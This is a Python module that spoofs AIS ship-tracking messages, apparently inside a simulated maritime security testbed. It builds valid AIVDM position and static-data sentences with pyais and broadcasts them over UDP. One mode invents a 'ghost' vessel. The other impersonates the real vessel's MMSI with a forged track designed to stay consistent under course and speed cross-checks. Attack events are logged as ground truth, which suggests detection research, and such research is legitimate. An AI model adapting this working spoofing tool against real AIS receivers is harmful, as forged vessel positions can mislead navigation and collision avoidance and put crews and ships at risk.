"""
AIS spoofing/injection module.

Unlike GPS spoofing, this does NOT need to intercept/modify any real
protocol -- AIS in this project is broadcast-only (nothing consumes it
for navigation), so the attack is simply crafting and broadcasting valid
AIVDM sentences onto the same UDP channel the WO-02 emulator uses. This
is exactly what a real AIS spoofing attack looks like: an attacker with
a radio transmitter broadcasting fabricated messages that any receiver
in range will decode as legitimate, because AIS has no message-level
authentication.

Requires: pip install pyais (same library WO-02 already used)

Two modes:
  ghost   - broadcasts a fully fabricated vessel that doesn't exist
  impersonate - broadcasts forged position under the REAL vessel's own
                MMSI, conflicting with its genuine reports
"""

import socket
import time
import threading
import math
import csv
import os
import sys
from pyais.encode import encode_dict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import constants

# --- Config --------------------------------------------------------------

AIS_BROADCAST_ADDR = constants.AIS_UDP_ADDR  # same port the AIS emulator uses

REAL_VESSEL_MMSI = constants.VESSEL_MMSI  # single source of truth, shared
                                            # with nodes/ais_emulator/ais_emulator.py

# Approximate area to place the ghost vessel / impersonation drift around,
# based on the sydney_regatta home coordinates used throughout this project.
HOME_LAT = constants.HOME_LAT
HOME_LON = constants.HOME_LON

ATTACK_LOG_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "attack_logs", "ais_spoof_ground_truth.csv")

# --- Ground truth logging (private) ---------------------------------------

os.makedirs(os.path.dirname(ATTACK_LOG_PATH), exist_ok=True)
_log_lock = threading.Lock()


def log_attack_event(wall_ts, attack_type, mmsi_used, lat, lon, note):
    with _log_lock:
        write_header = not os.path.exists(ATTACK_LOG_PATH)
        with open(ATTACK_LOG_PATH, "a", newline="") as f:
            w = csv.writer(f)
            if write_header:
                w.writerow(["wall_ts", "attack_type", "mmsi_used", "lat", "lon", "note"])
            w.writerow([wall_ts, attack_type, mmsi_used, lat, lon, note])


# --- AIS message construction ---------------------------------------------

def broadcast_ais_position(sock, mmsi, lat, lon, sog_knots, cog_deg):
    """Encodes and sends a Type 1 (position report) AIVDM sentence."""
    data = {
        "type": 1,
        "mmsi": mmsi,
        "lat": lat,
        "lon": lon,
        "speed": sog_knots,
        "course": cog_deg,
        "status": 0,  # under way using engine
    }
    sentences = encode_dict(data)
    for s in sentences:
        sock.sendto((s + "\r\n").encode("ascii"), AIS_BROADCAST_ADDR)


def broadcast_ais_static(sock, mmsi, vessel_name, destination="UNKNOWN"):
    """Encodes and sends a Type 5 (static/voyage data) AIVDM sentence."""
    data = {
        "type": 5,
        "mmsi": mmsi,
        "shipname": vessel_name,
        "destination": destination,
        "ship_type": 37,  # pleasure craft, arbitrary
    }
    sentences = encode_dict(data)
    for s in sentences:
        sock.sendto((s + "\r\n").encode("ascii"), AIS_BROADCAST_ADDR)


# --- Attack modes ----------------------------------------------------------

def _advance(lat, lon, heading_deg, speed_knots, dt_s):
    """One straight-line physics step, the same relationship a real
    transponder's own dead-reckoning would have to its own broadcast
    course/speed -- so a receiver cross-checking consecutive fixes against
    the claimed COG/SOG always finds them consistent, instead of a fixed
    heading/speed pair that has nothing to do with how the dot actually
    moves on the chart."""
    dist_m = speed_knots * 0.514444 * dt_s  # knots -> m/s
    bearing_rad = math.radians(heading_deg)
    lat += (dist_m * math.cos(bearing_rad)) / constants.M_PER_DEG_LAT
    lon += (dist_m * math.sin(bearing_rad)) / constants.m_per_deg_lon(lat)
    return lat, lon


def run_ghost_vessel(sock, stop_event, ghost_mmsi=999999001, interval_s=5.0,
                      speed_knots=6.0, heading_deg=250.0):
    """Broadcasts a fully fabricated vessel that doesn't exist in the
    simulation at all. Holds a straight-line course at a fixed
    speed/heading, like a real vessel underway -- the broadcast COG/SOG
    always match its own actual track between fixes."""
    print(f"Ghost vessel MMSI {ghost_mmsi} broadcasting every {interval_s}s...")
    broadcast_ais_static(sock, ghost_mmsi, "PHANTOM", "NOWHERE")
    lat, lon = HOME_LAT + 0.0015, HOME_LON + 0.0015
    last_t = time.time()
    while not stop_event.is_set():
        now = time.time()
        lat, lon = _advance(lat, lon, heading_deg, speed_knots, now - last_t)
        last_t = now
        broadcast_ais_position(sock, ghost_mmsi, lat, lon, sog_knots=speed_knots, cog_deg=heading_deg)
        log_attack_event(time.time(), "ghost", ghost_mmsi, lat, lon, "fabricated vessel")
        stop_event.wait(interval_s)


def run_impersonation(sock, stop_event, real_position_fn, offset_m=200.0,
                       bearing_deg=45.0, interval_s=2.0, speed_knots=6.0):
    """Broadcasts forged position under the REAL vessel's own MMSI, so a
    receiver sees two conflicting reports for the same identity.

    Anchors near the real vessel's position ONCE, at attack start, then
    moves under its own straight-line course/speed from there -- it does
    NOT re-lock onto the real vessel's live position every tick (a real
    attacker has no way to track that in real time either, and a fixed
    offset that perfectly mirrors the real vessel's every move is an
    obvious tell, not a believable second vessel).

    real_position_fn: a callable returning (lat, lon) for the real
    vessel's current true position, used once to anchor the forged track
    near where the real vessel actually is. Falls back to a fixed
    approximate position if unavailable.
    """
    try:
        true_lat, true_lon = real_position_fn()
    except Exception:
        true_lat, true_lon = HOME_LAT, HOME_LON

    bearing_rad = math.radians(bearing_deg)
    lat = true_lat + (offset_m * math.cos(bearing_rad)) / constants.M_PER_DEG_LAT
    lon = true_lon + (offset_m * math.sin(bearing_rad)) / constants.m_per_deg_lon(true_lat)

    print(f"Impersonating MMSI {REAL_VESSEL_MMSI}, starting {offset_m}m off the true "
          f"position, broadcasting every {interval_s}s...")
    last_t = time.time()
    while not stop_event.is_set():
        now = time.time()
        lat, lon = _advance(lat, lon, bearing_deg, speed_knots, now - last_t)
        last_t = now
        broadcast_ais_position(sock, REAL_VESSEL_MMSI, lat, lon, sog_knots=speed_knots, cog_deg=bearing_deg)
        log_attack_event(time.time(), "impersonate", REAL_VESSEL_MMSI, lat, lon,
                          f"anchor_true=({true_lat:.6f},{true_lon:.6f})")
        stop_event.wait(interval_s)


# --- Interactive control ---------------------------------------------------

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    stop_event = threading.Event()
    active_thread = None

    def fixed_position_fallback():
        # Placeholder -- replace with a real live GPS read if available
        # (e.g. subscribe to the same /wamv/sensors/gps/gps/fix topic the
        # dashboard uses). Using a fixed point means the impersonation
        # offset won't track real vessel movement -- fine for an initial
        # test, but note this limitation when reporting results.
        return HOME_LAT, HOME_LON

    print("Commands: 'ghost' | 'impersonate' | 'off' | 'quit'")
    while True:
        cmd = input("> ").strip().lower()
        if active_thread and active_thread.is_alive():
            stop_event.set()
            active_thread.join(timeout=2)
        stop_event = threading.Event()

        if cmd == "ghost":
            active_thread = threading.Thread(
                target=run_ghost_vessel, args=(sock, stop_event), daemon=True)
            active_thread.start()
        elif cmd == "impersonate":
            active_thread = threading.Thread(
                target=run_impersonation,
                args=(sock, stop_event, fixed_position_fallback), daemon=True)
            active_thread.start()
        elif cmd == "off":
            print("Attack stopped.")
        elif cmd == "quit":
            os._exit(0)
        else:
            print("Unknown command. Use: ghost | impersonate | off | quit")


if __name__ == "__main__":
    main()
